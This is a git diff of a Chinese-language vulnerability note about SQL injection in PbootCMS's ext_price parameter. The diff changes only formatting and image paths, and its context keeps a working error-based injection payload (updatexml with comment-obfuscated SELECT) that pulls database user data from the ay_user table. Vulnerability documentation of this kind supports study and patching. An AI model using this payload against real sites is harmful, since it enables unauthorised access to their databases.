@@ -1,4 +1,4 @@
-# PbootCMS ext_price SQL注入漏洞
+# PbootCMS ext\_price SQL注入漏洞
 
 ## 漏洞描述
 
@@ -20,12 +20,12 @@ app="PBOOTCMS"
 
 主页
 
-![](images/202202170926840.png)
+![](../.gitbook/assets/202202170926840.png)
 
 测试 Payload
 
-```plain
+```
 /index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123)
 ```
 
-![](images/202202170926157.png)
+![](../.gitbook/assets/202202170926157.png)
